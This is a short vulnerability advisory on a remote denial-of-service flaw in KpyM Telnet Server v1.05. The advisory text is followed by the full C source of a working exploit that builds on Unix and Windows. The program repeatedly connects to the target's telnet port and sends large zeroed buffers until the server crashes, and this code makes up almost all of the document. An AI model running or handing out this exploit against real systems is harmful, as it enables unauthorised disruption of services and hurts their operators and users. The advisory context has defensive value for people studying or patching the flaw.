source: http://www.securityfocus.com/bid/9379/info

KpyM Telnet Server has been reported to be prone to a remote denial of service vulnerability. Due to a lack of resource limitations, a remote attacker may negotiate multiple connections to the affected server. This will cause multiple instances of the a terminal handler executable to be spawned and ultimately, over time, an access violation will be triggered in the KpyM Telnet Server.

/* By NoRpiuS 
*  UNIX & WIN VERSION 
*  USE -DWIN to compile on windows
*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#ifdef WIN
    #include <winsock.h>
    #define close   closesocket
#else
    #include <unistd.h>
    #include <sys/socket.h>
    #include <sys/types.h>
    #include <arpa/inet.h>
    #include <netdb.h>
#endif

#define PORT    23
#define BUFFSZ  10000   

u_long resolv(char *host);
void std_err(void);

int main(int argc, char *argv[]) {
    u_char  *buff;
    struct  sockaddr_in peer;
    int     sd, err;
    u_short port = PORT;


    setbuf(stdout, NULL);

    fputs("\n"
        "KpyM Telnet Server v1.05 remote DoS\n"
        "by NoRpiUs\n"
        "e-mail: norpius@altervista.org\n"
        "web:    http://norpius.altervista.org\n"
        "\n", stdout);

    if(argc < 2) {
        printf("\nUso: %s <ip>\n\n",argv[0]);
        exit(1);
    }



#ifdef WIN
    WSADATA    wsadata;
    WSAStartup(MAKEWORD(1,0), &wsadata);
#endif

    peer.sin_addr.s_addr = resolv(argv[1]);
    peer.sin_port        = htons(port);
    peer.sin_family      = AF_INET;


    buff = malloc(BUFFSZ);
    if(!buff) 
    {
          fputs("[-] Can't allocate buffer\n", stdout);
          exit(0);
    }
        

    sd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if(sd < 0) 
    {
          fputs("[-] Can't create socket\n", stdout);
          exit(0);
    }

    printf("\n[+] Connecting to %s:%hu...\n",
        inet_ntoa(peer.sin_addr), port);
    err = connect(sd, (struct sockaddr *)&peer, sizeof(peer));
    if(err < 0) 
    {
          fputs("[-] Can't connect\n", stdout);
          exit(0);
    }

    err = recv(sd, buff, BUFFSZ, 0);
    if(err < 0) 
    {
          fputs("[-] No response from the server", stdout);
          exit(0);
    }

    memset(buff, 0, BUFFSZ);

    fputs("[+] Waiting for the crash.. ", stdout);
   
    while(1) 
    {                
       err = send(sd, buff, BUFFSZ, 0);
       if(err < 0) 
       {
          fputs("[-] Can't send\n", stdout);
          exit(0);
       }
       printf(".");
       close(sd);
       sd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
       err = connect(sd, (struct sockaddr *)&peer, sizeof(peer));
       if ( err < 0 ) 
       {
           fputs("\n[+] Crashed\n\r", stdout);
           exit(0);
       }
    }
    
    close(sd);
    return(0);
}


u_long resolv(char *host) {
    struct hostent *hp;
    u_long host_ip;

    host_ip = inet_addr(host);
    if(host_ip == INADDR_NONE) 
    {
        hp = gethostbyname(host);
        if(!hp) 
        {
            printf("\nError: Unable to resolve hostname (%s)\n", host);
            exit(1);
        } 
    else host_ip = *(u_long *)(hp->h_addr);
    }
    return(host_ip);
}